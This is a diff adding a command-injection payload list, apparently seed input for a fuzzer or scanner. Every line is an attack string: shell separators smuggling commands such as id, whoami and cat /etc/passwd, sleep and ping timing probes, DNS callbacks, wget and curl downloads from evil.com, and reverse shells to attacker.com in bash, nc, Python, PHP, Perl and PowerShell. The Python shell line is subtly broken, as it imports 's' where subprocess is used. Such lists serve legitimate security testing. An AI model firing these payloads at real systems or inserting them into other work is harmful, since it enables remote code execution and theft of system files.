@@ -1,0 +1,109 @@
+# Command Injection Seed Payloads
+; ls
+| ls
+`ls`
+$(ls)
+& ls
+; id
+| id
+`id`
+$(id)
+; whoami
+| whoami
+`whoami`
+$(whoami)
+; pwd
+| pwd
+`pwd`
+$(pwd)
+; uname -a
+| uname -a
+`uname -a`
+; cat /etc/passwd
+| cat /etc/passwd
+; echo test
+| echo test
+| dir
+; dir
+`dir`
+| type %SystemRoot%\\win.ini
+; sleep 5
+| sleep 5
+`sleep 5`
+& ping -c 10 127.0.0.1 &
+| ping -n 10 127.0.0.1
+& nslookup google.com &
+1; ls
+1|ls
+1`ls`
+1 & ls
+1 && ls
+1 || ls
+1; cat /etc/passwd
+1|cat /etc/passwd
+1;id
+1|id
+1;whoami
+1;uname -a
+1|uname -a
+1;ping -c 1 127.0.0.1
+1|ping -n 1 127.0.0.1
+$(cat /etc/passwd)
+`cat /etc/passwd`
+& cat /etc/passwd #
+| cat /etc/passwd #
+';cat /etc/passwd;'
+";cat /etc/passwd;"
+'; ls; '
+"; ls; "
+1 & nslookup attacker.com &
+1 | nslookup attacker.com
+1; nslookup attacker.com
+%0Als
+%0Aid
+%0Awhoami
+%0Acat%20/etc/passwd
+|%20ls
+;%20id
+`%20whoami`
+$(id)
+`ls`
+$(cat /etc/passwd)
+1 & echo test &
+1|echo test
+1;echo test
+1$(echo test)
+1`echo test`
+1|echo test; exit
+1;echo test;exit
+1|echo test|echo test
+1|echo test && echo test
+1;echo test;echo test
+& ping -c 5 127.0.0.1 &
+| ping -c 5 127.0.0.1
+& whoami &
+| whoami
+& id &
+| id
+& ls -la &
+| ls -la
+1 & ping -c 1 127.0.0.1 &
+1|ping -n 1 127.0.0.1
+1;ping 127.0.0.1
+1|ping 127.0.0.1
+1 & wget http://evil.com/shell &
+1|wget http://evil.com/shell
+1;curl http://evil.com/shell
+1|curl http://evil.com/shell
+$(wget http://evil.com/shell)
+`wget http://evil.com/shell`
+$(curl http://evil.com/shell)
+`curl http://evil.com/shell`
+& nc -e /bin/sh attacker.com 4444 &
+| nc -e /bin/sh attacker.com 4444
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; python -c 'import socket,s,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+| powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker.com",4444)
+| powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
